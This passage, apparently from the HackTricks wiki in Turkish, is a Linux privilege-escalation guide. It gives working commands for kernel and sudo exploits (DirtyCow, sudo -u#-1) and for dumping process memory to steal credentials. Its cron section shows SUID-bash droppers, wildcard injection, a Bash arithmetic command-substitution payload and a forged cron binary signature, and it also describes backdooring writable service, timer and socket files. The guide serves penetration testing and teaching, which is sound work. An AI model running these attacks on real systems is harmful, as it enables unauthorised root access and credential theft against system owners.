# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkeninin içindeki herhangi bir klasöre yazma izniniz varsa** bazı kütüphaneleri veya binaries'i hijack edebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol et ve privilege escalation için kullanılabilecek bir exploit olup olmadığını kontrol et
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir güvenlik açığı bulunan kernel listesi ve bazı zaten **compiled exploits** şurada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O siteden tüm güvenlik açığı bulunan kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploit'lerini aramak için yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim içinde çalıştırın, sadece kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve bu sayede bu exploit'in geçerli olduğundan emin olursunuz.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Listede görünen güvenlik açığı bulunan sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
sudo sürümünün açık olup olmadığını bu grep komutuyla kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo 1.9.17p1'den önceki sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**) kullanıcı tarafından kontrol edilen bir dizinden `/etc/nsswitch.conf` dosyası kullanıldığında, yetkisiz yerel kullanıcıların sudo `--chroot` seçeneği aracılığıyla root ayrıcalıklarına yükselmesine izin veriyor.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Exploit'i çalıştırmadan önce `sudo` sürümünüzün etkilenebilir olduğunu ve `chroot` özelliğini desteklediğini doğrulayın.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu vuln'ün nasıl exploited olabileceğine dair bir **örnek** için **smasher2 box of HTB**'ye bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunma önlemlerini listeleyin

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, buradan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Diskler

Nelerin **mounted and unmounted** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer bir şey unmounted ise, onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Yararlı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **any compiler is installed** olup olmadığını kontrol edin. Bu, bazı kernel exploit'lerini kullanmanız gerekirse faydalıdır; çünkü bunları kullanacağınız makinede (veya benzer bir makinede) compile etmeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kurulu Zafiyete Açık Yazılımlar

Kurulu paketlerin ve servislerin **sürümünü** kontrol edin. Belki eski bir Nagios sürümü (örneğin) vardır ve bu, escalating privileges için exploited olabilir…\
Daha şüpheli kurulu yazılımların sürümlerini elle kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Eğer makineye SSH ile erişiminiz varsa, makine içinde kurulu güncel olmayan ve zafiyetli yazılımları kontrol etmek için **openVAS** kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramayacak çok fazla bilgi göstereceğini unutmayın; bu nedenle kurulu herhangi bir yazılım sürümünün bilinen exploits'e karşı zafiyetli olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamalar kullanmanız önerilir._

## İşlemler

Hangi **işlemlerin** çalıştırıldığını inceleyin ve herhangi bir işlemin **gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (ör. tomcat'in root tarafından çalıştırılıyor olması?).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Bazı sunucu servisleri **kimlik bilgilerini belleğin içinde düz metin olarak** saklar.\
Normalde diğer kullanıcılara ait süreçlerin belleğini okumak için **root privileges** gerekir; bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha faydalıdır.\
Ancak unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makine varsayılan olarak **ptrace'e izin vermez**, bu da ayrıcalıksız kullanıcınıza ait diğer süreçlerin dökümünü alamayacağınız anlamına gelir.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid'ye sahip oldukları sürece tüm süreçler debug edilebilir. Bu, ptrace'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece bir ebeveyn süreç debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir, çünkü CAP_SYS_PTRACE yeteneği gereklidir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptrace'i tekrar etkinleştirmek için reboot gerekir.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa Heap'i alıp içindeki kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için, **maps bu işlemin sanal adres alanı içinde belleğin nasıl haritalandığını gösterir**; ayrıca **her haritalanmış bölgenin izinlerini** gösterir. The **mem** pseudo dosyası **işlemin belleğinin kendisini ortaya koyar**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve offsetlerini öğreniriz. Bu bilgiyi **mem dosyasında seek yapıp tüm okunabilir bölgeleri dump ederek** bir dosyaya kaydetmek için kullanırız.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sisteme ait **fiziksel** belleğe erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubundan okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış bir versiyonudur. Şuradan edinebilirsiniz: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlemin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini elle kaldırabilir ve size ait olan işlemi dump edebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator process'in çalıştığını görürseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilir (bir process'in memory'sini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Bu araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekteki **düz metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardan** çalar. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Aktif HTTP Basic Auth Oturumları)        | apache2              |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)   | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron görevleri

### Crontab UI (alseambusher) root olarak çalışıyorsa – web tabanlı zamanlayıcı privesc

Eğer web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, yine de SSH ile yerel port yönlendirmesi aracılığıyla ona erişebilir ve ayrıcalıklı bir görev oluşturarak yükseltme gerçekleştirebilirsiniz.

Tipik zincir
- Loopback'a özel portu (ör. 127.0.0.1:8000) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile bulun
- Kimlik bilgilerini operasyonel artefaktlarda bulun:
- Yedekler/scriptler (`zip -P <password>`)
- systemd unit'ında `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tünel açıp giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- high-priv job oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Sertleştirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve minimum izinlerle kısıtlayın
- localhost'a bağlayın ve ek olarak erişimi firewall/VPN ile kısıtlayın; şifreleri yeniden kullanmayın
- unit files içine secrets gömmekten kaçının; secret stores veya root-only EnvironmentFile kullanın
- on-demand job executions için audit/logging etkinleştirin

Herhangi bir scheduled job'un vulnerable olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizine belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Örneğin, _/etc/crontab_ içinde PATH'i şu şekilde bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma yetkisine sahip olduğunu unutmayın_)

Bu crontab içinde root kullanıcısı path ayarlamadan herhangi bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Sonrasında, şu komutu kullanarak root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ile joker karakter içeren bir script kullanımı (Wildcard Injection)

Eğer root tarafından çalıştırılan bir script'in bir komutunun içinde “**\***” varsa, bunu beklenmeyen şeyler (örn. privesc) yapmak için kötüye kullanabilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wildcard bir yolun önünde ise** _**/some/path/\***_ **, zafiyetli değildir (hatta** _**./\***_ **de değildir).**

Daha fazla wildcard exploitation hilesi için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içindeki arithmetic evaluation'dan önce parameter expansion ve command substitution uygular. Eğer root cron/parser güvensiz log alanlarını okuyup bunları arithmetic context'e veriyorsa, bir saldırgan cron çalıştığında root olarak çalışacak bir command substitution $(...) enjekte edebilir.

- Neden işe yarar: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalışır), kalan sayısal `0` ise arithmetic için kullanılır ve script hata olmadan devam eder.

- Tipik zafiyetli örnek:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parçalanan log'a saldırgan kontrollü metin yazdırın, böylece sayısal görünen alan command substitution içersin ve bir rakamla bitsin. Komutunuzun stdout'a yazmamasını (veya yönlendirilmesini) sağlayın ki arithmetic geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından yürütülen bir cron scriptini **değiştirebiliyorsanız**, çok kolayca bir shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **tam erişiminizin olduğu bir dizini** kullanıyorsa, o klasörü silmek ve **sizin kontrolünüzdeki bir scripti sunan başka bir dizine symlink klasör oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Yazılabilir payload'lı özel imzalı cron ikili dosyaları
Blue team'ler bazen cron tarafından çalıştırılan ikili dosyaları, özel bir ELF bölümü döküp vendor string'i grep'leyerek root olarak çalıştırmadan önce "imzalar". Eğer o ikili dosya grup-yazılabilir ise (ör. `/opt/AV/periodic-checks/monitor` sahibi `root:devs 770`) ve imzalama materyalini leak edebiliyorsanız, bölümü sahteleyip cron görevini ele geçirebilirsiniz:

1. Doğrulama akışını yakalamak için `pspy` kullanın. Era'da root şu komutu çalıştırdı: `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` ve sonra dosyayı yürüttü.
2. Beklenen sertifikayı leaked key/config (from `signing.zip`) kullanarak yeniden oluşturun:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Kötü amaçlı bir ikame oluşturun (ör. SUID bash bırakmak, SSH anahtarınızı eklemek) ve sertifikayı `.text_sig` içine gömün ki grep geçsin:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Yürütme bitlerini koruyarak planlanmış ikiliyi üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; basit imza kontrolü başarılı olunca payload'ınız root olarak çalışır.

### Sık cron görevleri

Süreçleri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan işlemleri arayabilirsiniz. Belki bundan faydalanıp yetki yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izlemek**, **daha az çalıştırılmış komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şu şekilde yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron jobs

Yorumdan sonra **carriage return koyarak** (yeni satır karakteri olmadan) bir cronjob oluşturmak mümkündür ve cron job çalışır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Yazabileceğiniz herhangi bir `.service` dosyası olup olmadığını kontrol edin, eğer varsa **onu değiştirebilirsiniz** böylece servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unuz **çalıştırılır** (muhtemelen makinenin reboot edilmesini beklemeniz gerekecektir).\
Örneğin `.service` dosyasının içine backdoor'unuzu **`ExecStart=/tmp/script.sh`** ile koyun

### Yazılabilir servis ikili dosyaları

Unutmayın ki eğer servisler tarafından çalıştırılan ikili dosyalar üzerinde **yazma izinleriniz** varsa, bunları backdoors için değiştirebilir ve servisler yeniden çalıştırıldığında backdoors'lar çalıştırılacaktır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **write** yapabildiğinizi fark ederseniz, **escalate privileges** yapabilirsiniz. Aşağıdaki gibi service configuration dosyalarında **relative paths being used on service configurations** aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ardından, yazma izniniz olan systemd PATH klasörünün içine, **göreli yol ikili dosyasıyla aynı ada sahip bir çalıştırılabilir dosya (executable)** oluşturun ve servis kırılgan eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **backdoor çalıştırılacaktır** (yetkisiz kullanıcılar genellikle servisleri başlatamaz/durduramaz ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında daha fazlasını `man systemd.service` ile öğrenin.**

## **Zamanlayıcılar**

**Zamanlayıcılar** systemd birim dosyalarıdır; isimleri `**.timer**` ile biter ve `**.service**` dosyalarını veya olayları kontrol eder. **Zamanlayıcılar**, takvim zaman olayları ve monotonik zaman olayları için yerleşik desteğe sahip olduklarından cron'un alternatifi olarak kullanılabilir ve asenkron şekilde çalıştırılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Writable timers

Eğer bir timer'ı değiştirebilirseniz, systemd.unit'e ait bazı mevcut öğelerin (örneğin `.service` veya `.target`) çalıştırılmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Belgede Unit'in ne olduğu şöyle açıklanıyor:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Bu nedenle, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- Bazı systemd unit'lerini (ör. `.service`) bulun ki **yazılabilir bir binary çalıştırıyor**
- Bazı systemd unit'lerini bulun ki **göreli bir yol çalıştırıyor** ve **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olun (o yürütülebilir dosyayı taklit etmek için)

Learn more about timers with `man systemd.timer`.

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Not: **timer**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` konumuna ona bir symlink oluşturarak **aktif edilir**.

## Soketler

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makineler arasında **proses iletişimini** sağlar. Bilgisayarlar arası iletişim için standart Unix tanımlayıcı dosyalarını kullanırlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Soketler `.socket` dosyaları kullanılarak yapılandırılabilir.

**`man systemd.socket` ile soketler hakkında daha fazla bilgi edinin.** Bu dosyada birkaç ilginç parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak özet olarak **soketin nerede dinleyeceğini belirtmek** için kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Bir boolean argüman alır. Eğer **true** ise, gelen her bağlantı için bir **service instance** oluşturulur ve sadece bağlantı soketi ona aktarılır. Eğer **false** ise, tüm dinleme soketleri başlatılan service unit'ine **aktarılır** ve tüm bağlantılar için yalnızca bir service unit oluşturulur. Bu değer, tek bir service unit'inin koşulsuz olarak tüm gelen trafiği ele aldığı datagram soketleri ve FIFO'lar için göz ardı edilir. **Varsayılan: false**. Performans sebepleriyle, yeni daemon'ların yalnızca `Accept=no` için uygun şekilde yazılması tavsiye edilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; sırasıyla dinleme **sockets**/FIFO'ları **oluşturulmadan önce** veya **oluşturulduktan ve bağlandıktan sonra** yürütülürler. Komut satırının ilk bileşeni mutlak bir dosya adı olmalı, ardından süreç için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFO'ları **kapatılmadan önce** veya **kapatıldıktan sonra** yürütülen ek **komutlar**dır.
- `Service`: Gelen trafik üzerinde **aktif edilecek** **service** unit adını belirtir. Bu ayar yalnızca Accept=no olan soketlere izin verilir. Varsayılan olarak soketle aynı ada sahip (sonek değiştirilmiş) service'ı kullanır. Çoğu durumda bu seçeneği kullanmaya gerek yoktur.

### Yazılabilir .socket dosyaları

Eğer **yazılabilir** bir `.socket` dosyası bulursanız `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz** ve backdoor socket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, muhtemelen makinenin yeniden başlatılmasını **beklemeniz gerekecektir.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Yazılabilir soketler

Eğer herhangi bir **yazılabilir socket** tespit ederseniz (_şimdi bahsettiğimiz Unix Sockets ve konfigürasyon `.socket` dosyaları değil_), o socket ile **iletişim kurabilir** ve belki bir zafiyetten faydalanabilirsiniz.

### Unix Soketlerini Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Unutmayın ki bazı **sockets listening for HTTP** istekleri olabilir (_.socket dosyalarından değil, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket **HTTP bir isteğe yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki **bazı zafiyetleri istismar edebilirsiniz**.

### Yazılabilir Docker Socket

